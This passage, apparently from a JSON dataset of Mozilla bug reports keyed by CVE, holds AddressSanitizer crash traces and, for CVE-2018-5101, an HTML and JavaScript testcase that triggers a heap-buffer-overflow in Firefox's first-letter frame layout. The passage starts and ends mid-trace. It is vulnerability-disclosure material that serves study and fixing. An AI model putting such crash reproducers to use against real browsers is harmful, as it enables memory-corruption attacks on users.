0x7f9045bb47fa in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:703:34 #73 0x4ec2de in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:63:30 #74 0x4ec2de in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #75 0x7f905886b82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #76 0x41dbc8 in _start (/fuzzer3/firefox/firefox+0x41dbc8) 0x60d0000438fc is located 28 bytes inside of 136-byte region [0x60d0000438e0,0x60d000043968) freed by thread T0 (file:// Content) here: #0 0x4bc0fb in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f903af57067 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2729:25 #2 0x7f903af5e70b in FreeSnowWhite /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2917:3 #3 0x7f903af5e70b in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3925 #4 0x7f903af5dc23 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3746:9 #5 0x7f903af61a70 in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4315:21 #6 0x7f903dfa574d in nsJSContext::CycleCollectNow(nsICycleCollectorListener*) /builds/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1505:3 #7 0x7f903daf2feb in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1437:3 #8 0x7f903b0e77e1 in NS_InvokeByIndex /builds/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:129 #9 0x7f903c8cee40 in Invoke /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1996:12 #10 0x7f903c8cee40 in Call /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1315 #11 0x7f903c8cee40 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1282 #12 0x7f903c8d5bcf in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:929:12 #13 0x7f9045e5f2b0 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #14 0x7f9045e5f2b0 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #15 0x7f9045e4a7ec in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #16 0x7f9045e4a7ec in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3098 #17 0x7f9045e3287a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #18 0x7f9045e5f3af in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #19 0x7f9045e602a2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #20 0x7f90468a3293 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2973:12 #21 0x7f903c7ee35b in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:315:18 #22 0x7f9045e5f2b0 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #23 0x7f9045e5f2b0 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #24 0x7f9045e4a7ec in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #25 0x7f9045e4a7ec in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3098 #26 0x7f9045e3287a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #27 0x7f9045e5f3af in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #28 0x7f9045e602a2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #29 0x7f90468a511b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3032:12 #30 0x7f903f43cb17 in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:47:8 #31 0x7f903fe0c13c in HandleEvent<mozilla::dom::EventTarget *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:65:12 #32 0x7f903fe0c13c in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1115 #33 0x7f903fe0e342 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1293:20 #34 0x7f903fdedd2a in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:486:14 #35 0x7f903fdf0f32 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:826:9 #36 0x7f903fdc01ba in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:895:12 #37 0x7f903df8b7c1 in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1356:5 previously allocated by thread T0 (file:// Content) here: #0 0x4bc44c in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ed85d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:84:17 #2 0x7f90400125a3 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:206:12 #3 0x7f90400125a3 in NS_NewHTMLBodyElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/worker/workspace/build/src/dom/html/HTMLBodyElement.cpp:24 #4 0x7f9042a4711f in nsContentDLF::CreateBlankDocument(nsILoadGroup*, nsIPrincipal*, nsDocShell*) /builds/worker/workspace/build/src/layout/build/nsContentDLF.cpp:308:5 #5 0x7f90451a6d2e in nsDocShell::CreateAboutBlankContentViewer(nsIPrincipal*, nsIURI*, bool, bool) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:8252:16 #6 0x7f904514645f in nsDocShell::EnsureContentViewer() /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:8128:17 #7 0x7f904517ada7 in GetDocument /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:4647:3 #8 0x7f904517ada7 in non-virtual thunk to nsDocShell::GetDocument() /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:4645 #9 0x7f903dbcff33 in MaybeCreateDoc /builds/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:4115:48 #10 0x7f903dbcff33 in GetDoc /builds/worker/workspace/build/src/obj-firefox/dist/include/nsPIDOMWindow.h:213 #11 0x7f903dbcff33 in EnsureInnerWindow /builds/worker/workspace/build/src/obj-firefox/dist/include/nsPIDOMWindow.h:978 #12 0x7f903dbcff33 in WrapObject /builds/worker/workspace/build/src/dom/base/nsGlobalWindow.h:302 #13 0x7f903dbcff33 in non-virtual thunk to nsGlobalWindow::WrapObject(JSContext*, JS::Handle<JSObject*>) /builds/worker/workspace/build/src/dom/base/nsGlobalWindow.h:300 #14 0x7f903c82f459 in XPCConvert::NativeInterface2JSObject(JS::MutableHandle<JS::Value>, xpcObjectHelper&, nsID const*, bool, nsresult*) /builds/worker/workspace/build/src/js/xpconnect/src/XPCConvert.cpp:758:23 #15 0x7f903c82e08f in XPCConvert::NativeData2JS(JS::MutableHandle<JS::Value>, void const*, nsXPTType const&, nsID const*, nsresult*) /builds/worker/workspace/build/src/js/xpconnect/src/XPCConvert.cpp:345:16 #16 0x7f903c8cfba9 in GatherAndConvertResults /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1532:18 #17 0x7f903c8cfba9 in Call /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1326 #18 0x7f903c8cfba9 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1282 #19 0x7f903c8d6385 in GetAttribute /builds/worker/workspace/build/src/js/xpconnect/src/xpcprivate.h:1679:17 #20 0x7f903c8d6385 in XPC_WN_GetterSetter(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:965 #21 0x7f9045e5f2b0 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #22 0x7f9045e5f2b0 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #23 0x7f9045e61285 in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #24 0x7f9045e61285 in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541 #25 0x7f9045e61285 in js::CallGetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:656 #26 0x7f9046de3b8c in CallGetter /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2118:16 #27 0x7f9046de3b8c in GetExistingProperty<js::AllowGC::CanGC> /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2171 #28 0x7f9046de3b8c in NativeGetPropertyInline<js::AllowGC::CanGC> /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2374 #29 0x7f9046de3b8c in js::NativeGetProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2410 #30 0x7f9045e6a8e8 in GetProperty /builds/worker/workspace/build/src/js/src/vm/NativeObject.h:1616:12 #31 0x7f9045e6a8e8 in GetProperty /builds/worker/workspace/build/src/js/src/jsobj.h:805 #32 0x7f9045e6a8e8 in js::GetProperty(JSContext*, JS::Handle<JS::Value>, JS::Handle<js::PropertyName*>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:4407 #33 0x7f9045e4cfe4 in GetPropertyOperation /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:219:12 #34 0x7f9045e4cfe4 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2817 #35 0x7f9045e3287a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #36 0x7f9045e5f3af in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #37 0x7f9045e602a2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #38 0x7f90468a3293 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2973:12 #39 0x7f903c8b5703 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedJSClass.cpp:1317:23 #40 0x7f903b0e8eca in PrepareAndDispatch /builds/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcstubs_x86_64_linux.cpp:120:28 #41 0x7f903b0e7ea6 in SharedStub (/fuzzer3/firefox/libxul.so+0x21dcea6) #42 0x7f90459bd819 in nsBrowserStatusFilter::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/toolkit/components/statusfilter/nsBrowserStatusFilter.cpp:211:27 #43 0x7f903cce2783 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1321:3 #44 0x7f903cce12e0 in nsDocLoader::FireOnStateChange(nsIWebProgress*, nsIRequest*, int, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1284:14 #45 0x7f903ccdfd55 in doStartURLLoad /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:799:3 #46 0x7f903ccdfd55 in nsDocLoader::OnStartRequest(nsIRequest*, nsISupports*) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:483 #47 0x7f903cce000c in non-virtual thunk to nsDocLoader::OnStartRequest(nsIRequest*, nsISupports*) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:394:14 #48 0x7f903b263c05 in mozilla::net::nsLoadGroup::AddRequest(nsIRequest*, nsISupports*) /builds/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:510:28 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/dom/base/nsINode.h:1614:12 in GetBoolFlag Shadow bytes around the buggy address: 0x0c1a800006c0: fd fd fd fd fd fa fa fa fa fa fa fa fa fa fd fd 0x0c1a800006d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa 0x0c1a800006e0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c1a800006f0: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa 0x0c1a80000700: fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c1a80000710: fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd[fd] 0x0c1a80000720: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa 0x0c1a80000730: fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd 0x0c1a80000740: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c1a80000750: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1a80000760: fd fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==25937==ABORTING"
      }
    ],
    "CVE-2018-5101": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1417661",
        "title": "heap-buffer-overflow in nsFirstLetterFrame::CreateContinuationForFloatingParent",
        "description": "The following testcase crashes the latest ASAN build of Firefox 59.0a1 (SourceStamp=f0c0fb9182d695081edf170d8e3bcb8164f2c96a) crash.html: <script> function start() { o1481=new DOMParser(); o1506=o1481.parseFromString(undefined,'image/svg+xml'); o1621=document.createElement('style'); o1622=document.createTextNode('.class1'); o1621.appendChild(o1622); o1807=document.createElement('shadow'); document.replaceChild(o1506.documentElement,document.documentElement); document.documentElement.appendChild(o1621); o2064=document.createElementNS('http://www.w3.org/1999/xhtml','style'); o2065=document.createTextNode('{\"a\"\"\"}:root{ direction: rtl}\\n*{ display: unset}:first-letter{ -moz-border-start: inherit; float: inherit; border-inline-start-style: dashed}:first-line{}\\n*{ -moz-border-start-style: initial; float: right; -moz-column-width: 51mm;0'); o2064.appendChild(o2065); o1807.appendChild(o2064); document.documentElement.appendChild(o1807); document.documentElement['getBoxQuads'](undefined); o1622.after('undefined'); } </script> <body onload=\"start()\"></script> ASAN output: ================================================================= ==20193==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6030002674d8 at pc 0x7efe79ae5218 bp 0x7ffedbd1b5d0 sp 0x7ffedbd1b5c8 READ of size 8 at 0x6030002674d8 thread T0 (file:// Content) #0 0x7efe79ae5217 in Equals /builds/worker/workspace/build/src/layout/base/FrameProperties.h:399:16 #1 0x7efe79ae5217 in IndexOf<const mozilla::FramePropertyDescriptorUntyped *, mozilla::FrameProperties::PropertyComparator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1190 #2 0x7efe79ae5217 in GetInternal /builds/worker/workspace/build/src/layout/base/FrameProperties.h:413 #3 0x7efe79ae5217 in Get<nsPlaceholderFrame> /builds/worker/workspace/build/src/layout/base/FrameProperties.h:235 #4 0x7efe79ae5217 in GetProperty<nsPlaceholderFrame> /builds/worker/workspace/build/src/layout/generic/nsIFrame.h:3586 #5 0x7efe79ae5217 in GetPlaceholderFrame /builds/worker/workspace/build/src/layout/generic/nsIFrame.h:911 #6 0x7efe79ae5217 in nsFirstLetterFrame::CreateContinuationForFloatingParent(nsPresContext*, nsIFrame*, nsIFrame**, bool) /builds/worker/workspace/build/src/layout/generic/nsFirstLetterFrame.cpp:319 #7 0x7efe798c06ed in CreateContinuation(nsIFrame*, nsIFrame**, bool) /builds/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:647:23 #8 0x7efe798bd928 in EnsureBidiContinuation /builds/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:1865:10 #9 0x7efe798bd928 in nsBidiPresUtils::ResolveParagraph(BidiParagraphData*) /builds/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:924 #10 0x7efe798b7f16 in nsBidiPresUtils::Resolve(nsBlockFrame*) /builds/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:765:10 #11 0x7efe79a659ac in ResolveBidi /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:7528:10 #12 0x7efe79a659ac in nsBlockFrame::GetMinISize(gfxContext*) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:733 #13 0x7efe79ad1b1a in nsColumnSetFrame::GetMinISize(gfxContext*) /builds/worker/workspace/build/src/layout/generic/nsColumnSetFrame.cpp:542:35 #14 0x7efe79ad9117 in ShrinkWidthToFit /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:6237:22 #15 0x7efe79ad9117 in nsContainerFrame::ComputeAutoSize(gfxContext*, mozilla::WritingMode, mozilla::LogicalSize const&, int, mozilla::LogicalSize const&, mozilla::LogicalSize const&, mozilla::LogicalSize const&, nsIFrame::ComputeSizeFlags) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:845 #16 0x7efe79ae03f1 in nsFrame::ComputeSize(gfxContext*, mozilla::WritingMode, mozilla::LogicalSize const&, int, mozilla::LogicalSize const&, mozilla::LogicalSize const&, mozilla::LogicalSize const&, nsIFrame::ComputeSizeFlags) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:5496:24 #17 0x7efe79a0836e in FloatMarginISize(mozilla::ReflowInput const&, int, nsIFrame*, mozilla::SizeComputationInput const&) /builds/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:692:13 #18 0x7efe79a0491e in mozilla::BlockReflowInput::FlowAndPlaceFloat(nsIFrame*) /builds/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:759:30 #19 0x7efe79a09aba in mozilla::BlockReflowInput::PlaceBelowCurrentLineFloats(nsFloatCacheFreeList&, nsLineBox*) /builds/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:1078:19 #20 0x7efe79a90235 in nsBlockFrame::PlaceLine(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsFloatManager::SavedState*, mozilla::LogicalRect&, int&, bool*) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4704:12 #21 0x7efe79a8dfaa in nsBlockFrame::DoReflowInlineFrames(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4099:12 #22 0x7efe79a855e6 in nsBlockFrame::ReflowInlineFrames(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3845:9 #23 0x7efe79a7edd2 in nsBlockFrame::ReflowLine(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2829:5 #24 0x7efe79a74a4f in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2365:7 #25 0x7efe79a6bb3b in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1236:3 #26 0x7efe79ac985c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:934:14 #27 0x7efe79ace8bd in nsColumnSetFrame::ReflowChildren(mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) /builds/worker/workspace/build/src/layout/generic/nsColumnSetFrame.cpp:810:7 #28 0x7efe79ad3e3e in ReflowColumns /builds/worker/workspace/build/src/layout/generic/nsColumnSetFrame.cpp:507:19 #29 0x7efe79ad3e3e in nsColumnSetFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/nsColumnSetFrame.cpp:1245 #30 0x7efe79ac985c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:934:14 #31 0x7efe79ac80e4 in nsCanvasFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:757:5 #32 0x7efe79ac985c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:934:14 #33 0x7efe79b947e8 in nsHTMLScrollFrame::ReflowScrolledFrame(mozilla::ScrollReflowInput*, bool, bool, mozilla::ReflowOutput*, bool) /builds/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:552:3 #34 0x7efe79b95e9e in nsHTMLScrollFrame::ReflowContents(mozilla::ScrollReflowInput*, mozilla::ReflowOutput const&) /builds/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:664:3 #35 0x7efe79b991a9 in nsHTMLScrollFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:1041:3 #36 0x7efe79a5277f in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, int, int, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:978:14 #37 0x7efe79a5104b in mozilla::ViewportFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/ViewportFrame.cpp:336:7 #38 0x7efe7984a3cc in mozilla::PresShell::DoReflow(nsIFrame*, bool) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:8984:11 #39 0x7efe7985dc41 in mozilla::PresShell::ProcessReflowCommands(bool) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:9157:24 #40 0x7efe7985cec3 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:4230:11 #41 0x7efe797d0b52 in FlushPendingNotifications /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:579:5 #42 0x7efe797d0b52 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1921 #43 0x7efe797de75b in TickDriver /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:336:13 #44 0x7efe797de75b in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:306 #45 0x7efe797de456 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:328:5 #46 0x7efe797e09ab in RunRefreshDrivers /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:769:5 #47 0x7efe797e09ab in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:682 #48 0x7efe797e05b6 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:583:9 #49 0x7efe7a034f42 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /builds/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:68:16 #50 0x7efe73b98b21 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20 #51 0x7efe73a63f65 in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1815:28 #52 0x7efe736b91d9 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2119:25 #53 0x7efe736b61ef in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2049:17 #54 0x7efe736b7924 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1895:5 #55 0x7efe736b7f78 in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1928:15 #56 0x7efe728f5e86 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1037:14 #57 0x7efe72910618 in NS_ProcessNextEvent(nsIThread*, bool) 